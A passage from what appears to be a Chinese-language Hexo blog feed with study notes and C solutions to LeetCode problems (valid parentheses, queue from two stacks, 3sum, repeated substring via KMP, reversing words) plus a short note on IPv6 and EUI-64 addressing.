(j&lt;=<span class="number">0</span> || tmp[j<span class="number">-1</span>]!=<span class="string">'['</span>)) {</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            j--;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(j &gt; <span class="number">0</span>) <span class="comment">//若栈不为空则返回false</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>下面介绍<a href="https://programmercarl.com/0020.%E6%9C%89%E6%95%88%E7%9A%84%E6%8B%AC%E5%8F%B7.html#%E6%80%9D%E8%B7%AF">代码随想录</a>的解法：</p><p>遍历 s 字符串，遇到左括号，则入栈；遇到右括号则与栈顶元素进行配对</p><ul><li><p>第一种情况：已经遍历完了字符串，但是栈不为空，说明有相应的左括号没有右括号来匹配，所以returnfalse</p></li><li><p>第二种情况：遍历字符串匹配的过程中，发现栈里没有要匹配的字符。所以returnfalse</p></li><li><p>第三种情况：遍历字符串匹配的过程中，栈已经为空了，没有匹配的字符了，说明右括号没有找到对应的左括号returnfalse</p></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//辅助函数：判断栈顶元素与输入的括号是否为一对。若不是，则返回False</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">notMatch</span><span class="params">(<span class="type">char</span> par, <span class="type">char</span>* <span class="built_in">stack</span>, <span class="type">int</span> stackTop)</span> {</span><br><span class="line">    <span class="keyword">switch</span>(par) {</span><br><span class="line">        <span class="keyword">case</span> <span class="string">']'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">stack</span>[stackTop - <span class="number">1</span>] != <span class="string">'['</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">')'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">stack</span>[stackTop - <span class="number">1</span>] != <span class="string">'('</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'}'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">stack</span>[stackTop - <span class="number">1</span>] != <span class="string">'{'</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isValid</span><span class="params">(<span class="type">char</span> * s)</span>{</span><br><span class="line">    <span class="type">int</span> strLen = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="comment">//开辟栈空间</span></span><br><span class="line">    <span class="type">char</span> <span class="built_in">stack</span>[<span class="number">5000</span>];</span><br><span class="line">    <span class="type">int</span> stackTop = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//遍历字符串</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; strLen; i++) {</span><br><span class="line">        <span class="comment">//取出当前下标所对应字符</span></span><br><span class="line">        <span class="type">char</span> tempChar = s[i];</span><br><span class="line">        <span class="comment">//若当前字符为左括号，则入栈</span></span><br><span class="line">        <span class="keyword">if</span>(tempChar == <span class="string">'('</span> || tempChar == <span class="string">'['</span> || tempChar == <span class="string">'{'</span>)</span><br><span class="line">            <span class="built_in">stack</span>[stackTop++] = tempChar;</span><br><span class="line">        <span class="comment">//若当前字符为右括号，且栈中无元素或右括号与栈顶元素不符，返回False</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(stackTop == <span class="number">0</span> || notMatch(tempChar, <span class="built_in">stack</span>, stackTop))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//当前字符与栈顶元素为一对括号，将栈顶元素出栈</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            stackTop--;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//若栈中有元素，返回False。若没有元素（stackTop为0），返回True</span></span><br><span class="line">    <span class="keyword">return</span> !stackTop;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用栈实现队列</title>
    <link href="/2024/02/08/%E7%94%A8%E6%A0%88%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97/"/>
    <url>/2024/02/08/%E7%94%A8%E6%A0%88%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/implement-queue-using-stacks/</p><p>用两个栈实现队列，很容易想到：将第一个栈(输入栈)中的元素保存到第二个栈中，此时第二个栈(输出栈)就是原来元素形成的队列。</p><p><img src="https://code-thinking.cdn.bcebos.com/gifs/232.%E7%94%A8%E6%A0%88%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97%E7%89%88%E6%9C%AC2.gif"></p><p>实现的过程中，<code>myQueuePop()</code>函数总是有小错误：将输入栈将元素均存入了输出栈后，输入栈此时为<strong>空</strong>，调用取出队首元素后，不对输入栈进行处理；然后调用<code>myQueuePush()</code>函数，将新元素存入输入栈中，此时再调用<code>myQueuePop()</code>函数，将输入栈中新元素再存入输出栈中，接着取出队首元素，发生错误（元素顺序不正确）。</p><p>修改后的<code>myQueuePop()</code>函数：先将输入栈中元素存入<strong>输出栈</strong>中，取出队首元素，然后将剩余元素重新存入<strong>输入栈</strong>中，后面在调用<code>myQueuePush()</code>函数不会影响到元素顺序。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> {</span></span><br><span class="line">    <span class="type">int</span> stackInTop, stackOutTop;  <span class="comment">//记录栈顶下标</span></span><br><span class="line">    <span class="type">int</span> stackIn[<span class="number">100</span>], stackOut[<span class="number">100</span>]; <span class="comment">//用两个数组充当输入栈、输出栈</span></span><br><span class="line">} MyQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MyQueue* <span class="title function_">myQueueCreate</span><span class="params">()</span> {</span><br><span class="line">    MyQueue* q = (MyQueue*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(MyQueue));</span><br><span class="line">    q-&gt;stackInTop = <span class="number">0</span>;</span><br><span class="line">    q-&gt;stackOutTop = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> q;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">myQueuePush</span><span class="params">(MyQueue* obj, <span class="type">int</span> x)</span> {</span><br><span class="line">    obj-&gt;stackIn[obj-&gt;stackInTop++] = x;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">myQueuePop</span><span class="params">(MyQueue* obj)</span> {</span><br><span class="line">    <span class="type">int</span> stackOutTop = obj-&gt;stackOutTop;</span><br><span class="line">    <span class="type">int</span> stackInTop = obj-&gt;stackInTop;</span><br><span class="line">    <span class="keyword">if</span>(stackOutTop == <span class="number">0</span>) { <span class="comment">//输出栈为空</span></span><br><span class="line">        <span class="comment">//将第一个栈中元素复制到第二个栈中</span></span><br><span class="line">        <span class="keyword">while</span>(stackInTop &gt; <span class="number">0</span>) {</span><br><span class="line">            obj-&gt;stackOut[stackOutTop++] = obj-&gt;stackIn[--stackInTop];</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="type">int</span> top = obj-&gt;stackOut[--stackOutTop]; <span class="comment">//记录队头元素</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(stackOutTop &gt; <span class="number">0</span>) { <span class="comment">//出队后更新第一个栈的元素</span></span><br><span class="line">        obj-&gt;stackIn[stackInTop++] = obj-&gt;stackOut[--stackOutTop];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    obj-&gt;stackOutTop = stackOutTop;</span><br><span class="line">    obj-&gt;stackInTop = stackInTop;</span><br><span class="line">    <span class="keyword">return</span> top;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">myQueuePeek</span><span class="params">(MyQueue* obj)</span> {</span><br><span class="line">    <span class="keyword">return</span> obj-&gt;stackIn[<span class="number">0</span>];</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">myQueueEmpty</span><span class="params">(MyQueue* obj)</span> {</span><br><span class="line">    <span class="keyword">if</span>(obj-&gt;stackInTop==<span class="number">0</span> &amp;&amp; obj-&gt;stackOutTop==<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">myQueueFree</span><span class="params">(MyQueue* obj)</span> {</span><br><span class="line">    obj = <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>三数之和</title>
    <link href="/2024/02/08/%E4%B8%89%E6%95%B0%E4%B9%8B%E5%92%8C/"/>
    <url>/2024/02/08/%E4%B8%89%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/3sum/description/</p><p>这题使用双指针法比较合适：</p><ul><li><p>先使用<code>qsort()</code>函数将数组进行升序排序</p></li><li><p>由于是三数之和，所以使用一个for循环确定<strong>第一个元素下标i</strong>，初始化左右指针——使用<code>left</code>指针指向第二个元素（<strong>i+1</strong>），<code>right</code>指针指向数组<strong>最后一个元素</strong></p></li><li><p>当三数之和大于0时，执行<code>right--</code>，因为当前数组是有序的，所以左移右指针使得三数之和减小</p></li><li><p>当三数之和小于0时，执行<code>left++</code>，原理同上</p></li><li><p>难点在于去重，<strong>不能有重复的三元组，但三元组内的元素是可以重复的！</strong></p><ol type="1"><li><p>对一个元素去重：比较nums[i]和nums[i-1]</p><p>若 i&gt;0 且nums[i]==nums[i-1]，则说明三元组中第一个数不变，又因为此时右指针不做任何操作，即三元组中有两个值不变，则第三个值也是确定的，因此产生了重复的三元组</p></li><li><p>对后两个元素去重：原理同上</p></li></ol></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Return an array of arrays of size *returnSize.</span></span><br><span class="line"><span class="comment"> * The sizes of the arrays are returned as *returnColumnSizes array.</span></span><br><span class="line"><span class="comment"> * Note: Both returned array and *columnSizes array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">cmp</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* ptr1, <span class="type">const</span> <span class="type">void</span>* ptr2)</span> {</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">int</span>*)ptr1) &gt; *((<span class="type">int</span>*)ptr2);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>** <span class="title function_">threeSum</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span>* returnSize, <span class="type">int</span>** returnColumnSizes)</span>{</span><br><span class="line">    <span class="type">int</span> **ans = (<span class="type">int</span>**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>*)*numsSize  *numsSize);</span><br><span class="line">    <span class="type">int</span> ansTop = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(numsSize&lt;<span class="number">3</span>) { <span class="comment">//若数组元素个数小于3则返回空数组ans</span></span><br><span class="line">        *returnSize = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//升序，参数（数组名，数组大小，数组元素大小，排序原则）</span></span><br><span class="line">    qsort(nums, numsSize, <span class="keyword">sizeof</span>(<span class="type">int</span>), cmp); </span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;numsSize<span class="number">-2</span>; i++) {</span><br><span class="line">        <span class="keyword">if</span>(nums[i]&gt;<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">//升序后若第一个元素大于0，则三数之和一定大于0</span></span><br><span class="line">        <span class="keyword">if</span>(i&gt;<span class="number">0</span> &amp;&amp; nums[i] == nums[i<span class="number">-1</span>])</span><br><span class="line">            <span class="keyword">continue</span>; <span class="comment">//对a（第一个元素）去重</span></span><br><span class="line">        <span class="type">int</span> left=i+<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> right = numsSize - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(right&gt;left) {</span><br><span class="line">            <span class="type">int</span> sum = nums[right] + nums[left] + nums[i];</span><br><span class="line">            <span class="keyword">if</span>(sum&lt;<span class="number">0</span>)</span><br><span class="line">                left++;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(sum&gt;<span class="number">0</span>)</span><br><span class="line">                right--;</span><br><span class="line">            <span class="keyword">else</span> {</span><br><span class="line">                <span class="type">int</span>* arr = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*<span class="number">3</span>);</span><br><span class="line">                arr[<span class="number">0</span>] = nums[i];</span><br><span class="line">                arr[<span class="number">1</span>] = nums[left];</span><br><span class="line">                arr[<span class="number">2</span>] = nums[right];</span><br><span class="line">                ans[ansTop++] = arr;</span><br><span class="line">                <span class="keyword">while</span>(right &gt; left &amp;&amp; nums[right] == nums[right<span class="number">-1</span>])</span><br><span class="line">                    right--; <span class="comment">//对c（第三个元素）去重</span></span><br><span class="line">                <span class="keyword">while</span>(left &lt; right &amp;&amp; nums[left] == nums[left + <span class="number">1</span>])</span><br><span class="line">                    left++;  <span class="comment">//对b（第二个元素）去重</span></span><br><span class="line">                <span class="comment">//更新左右指针</span></span><br><span class="line">                left++;</span><br><span class="line">                right--;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设定返回的数组大小</span></span><br><span class="line">    *returnSize = ansTop;</span><br><span class="line">    *returnColumnSizes = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * ansTop);</span><br><span class="line">    <span class="type">int</span> z;</span><br><span class="line">    <span class="keyword">for</span>(z = <span class="number">0</span>; z &lt; ansTop; z++) {</span><br><span class="line">        (*returnColumnSizes)[z] = <span class="number">3</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重复的子字符串</title>
    <link href="/2024/02/07/%E9%87%8D%E5%A4%8D%E7%9A%84%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <url>/2024/02/07/%E9%87%8D%E5%A4%8D%E7%9A%84%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/repeated-substring-pattern/</p><p>注：这题的意思是判断给定的字符串能否<strong>只通过它的子字符串构成</strong>而<strong>不包含其他字符串</strong></p><p><a href="https://programmercarl.com/0459.%E9%87%8D%E5%A4%8D%E7%9A%84%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2.html#%E6%80%9D%E8%B7%AF">解题思路</a>：</p><ul><li><p>一个字符串能由它的子字符串构成，则<strong>该子字符串的长度不可能大于整个字符串长度的一半</strong></p></li><li><p>字符串s的最长相等<strong>前、后缀</strong>不包含的字符串就是<strong>最小重复的子串</strong></p><p><img src="https://code-thinking-1253855093.file.myqcloud.com/pics/20220728205249.png"></p><blockquote><p>步骤一：因为 <strong>前缀和后缀是相等的字符串</strong>，t[0] 与k[0]相同， t[1] 与 k[1]相同，所以 s[0] 一定和 s[2]相同，s[1] 一定和s[3]相同，即：，s[0]s[1]与s[2]s[3]相同 。</p><p>步骤二： 因为在同一个字符串位置，所以 t[2] 与 k[0]相同，t[3] 与k[1]相同。</p><p>步骤三： 因为 这是相等的前缀和后缀，t[2] 与 k[2]相同 ，t[3]与k[3]相同，所以，s[2]一定和s[4]相同，s[3]一定和s[5]相同，即：s[2]s[3] 与s[4]s[5]相同。</p><p>步骤四：循环往复。</p></blockquote></li><li><p>如果len % (len - next[len - 1]) == 0，则说明<strong>数组的长度</strong>正好可以被<strong>数组长度-最长相等前后缀的长度</strong> 整除，说明该字符串有重复的子字符串</p><blockquote><p>若<strong>next[len-1]==-1</strong>,则没有最长相等前后缀，也就不可能由重复的子字符串构成</p><p>若<strong>len-next[len-1] &gt;len/2</strong>，则也不存在满足要求的子字符串</p></blockquote></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">getNext</span><span class="params">(<span class="type">int</span>* next, <span class="type">char</span>* P)</span> {</span><br><span class="line">    next[<span class="number">0</span>] = <span class="number">0</span>; <span class="comment">//初始化next数组</span></span><br><span class="line">    <span class="type">int</span> now = <span class="number">0</span>; <span class="comment">//开始比较时，模式串下标</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;<span class="built_in">strlen</span>(P); ) {</span><br><span class="line">        <span class="keyword">if</span>(P[now] == P[i]) {</span><br><span class="line">            now+=<span class="number">1</span>;</span><br><span class="line">            next[i] = now;</span><br><span class="line">            i++;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(now!=<span class="number">0</span>)</span><br><span class="line">            now = next[now<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            next[i] = <span class="number">0</span>;</span><br><span class="line">            i++;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">repeatedSubstringPattern</span><span class="params">(<span class="type">char</span>* s)</span> {</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="type">int</span> next[len];</span><br><span class="line">    </span><br><span class="line">    getNext(next, s);   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(next[len<span class="number">-1</span>]!=<span class="number">0</span> &amp;&amp; len%(len-next[len<span class="number">-1</span>])==<span class="number">0</span>) </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
      <category>KMP算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IPv6</title>
    <link href="/2024/02/04/IPv6/"/>
    <url>/2024/02/04/IPv6/</url>
    
    <content type="html"><![CDATA[<p>IPv6特点：</p><ul><li><strong>只能在源点分片</strong>，传输过程中的路由器不能分片</li><li><strong>首部长度不可变</strong></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230718190626255.png"></p><ul><li><p>单播：一对一通信，可作为源地址和目的地址</p></li><li><p>多播：一对多通信，可作为目的地址</p></li><li><p>任播：一对多中的一个通信，可作为目的地址</p></li></ul><p>IPv4 向 IPv6 过渡：</p><ul><li><strong>双协议栈</strong>：既支持IPv4，又支持IPv6</li><li><strong>隧道技术</strong>：使IPv6数据报在IPv4中传输</li></ul><blockquote><p>IPv6可以与DHCP结合使用分配地址，也可以在不使用DHCP服务器的情况下也可以静态分配IPv6：</p><ul><li><p>使用 EUI-64（64位扩展唯一标识）将MAC地址（48位）转换成64位，再与64位IPv6前缀形成新地址（128位）</p></li><li><p>MAC地址转换成 EUI-64 格式的步骤：</p><ol type="1"><li><p>将二进制形式的MAC地址的第7位（又称<strong>U/Lbit</strong>）进行取反，相当于将<strong>BIA</strong>[burned-inaddress]转换成本地管理的地址。</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202402041055814.png"></p></li><li><p>在MAC地址的前三个字节和后三个字节之间添加<code>fffe</code></p></li><li><p>最后在前面加上IPv6的64位前缀</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202402041058301.png"></p></li></ol></li></ul></blockquote>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反转字符串中的单词</title>
    <link href="/2024/02/03/%E5%8F%8D%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%9A%84%E5%8D%95%E8%AF%8D/"/>
    <url>/2024/02/03/%E5%8F%8D%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%9A%84%E5%8D%95%E8%AF%8D/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/reverse-words-in-a-string/</p><p>这题的难点是去除多余的空格，分为三部分：开头的空格、中间多余的空格、结尾的空格。</p><ul><li>先去除开头的空格后，字符串开始位置<code>start</code>就不是0了</li><li>去除末尾的空格</li><li>在去除中间多余空格时，<strong>慢指针要从0开始</strong>，将字符串开始位置往前移，同时快指针需要从<code>start</code>开始向后移动直到字符串结尾，这样<code>s</code>就成为了新的没有多余空格的字符串</li><li>然后整个字符串翻转</li><li>最后每个单词单独翻转，得到结果</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">reverse</span><span class="params">(<span class="type">char</span>* s, <span class="type">int</span> start, <span class="type">int</span> end)</span> { <span class="comment">//翻转函数</span></span><br><span class="line">    <span class="type">int</span> i=start, j=end;</span><br><span class="line">    <span class="type">char</span> tmp;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;j) {</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];</span><br><span class="line">        s[j] = tmp;</span><br><span class="line">        i++;</span><br><span class="line">        j--;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="type">char</span>* <span class="title function_">reverseWords</span><span class="params">(<span class="type">char</span>* s)</span> {</span><br><span class="line">    <span class="type">int</span> slow=<span class="number">0</span>, fast=<span class="number">0</span>;  <span class="comment">//快慢指针</span></span><br><span class="line">    <span class="type">int</span> start=<span class="number">0</span>;  <span class="comment">//记录字符串开始位置</span></span><br><span class="line">    <span class="type">int</span> end = <span class="built_in">strlen</span>(s)<span class="number">-1</span>; <span class="comment">//记录字符串结束位置</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(s[start]==<span class="string">' '</span>) {</span><br><span class="line">        start++;</span><br><span class="line">    } <span class="comment">//去掉首部的空格</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(s[end]==<span class="string">' '</span>)</span><br><span class="line">        end--;   <span class="comment">//去掉结尾多余的空格</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(fast = start; fast&lt;=end; fast++) {</span><br><span class="line">        <span class="keyword">if</span>(s[fast] == <span class="string">' '</span> &amp;&amp; s[fast+<span class="number">1</span>] == <span class="string">' '</span>) {</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            s[slow++] = s[fast];</span><br><span class="line">    } <span 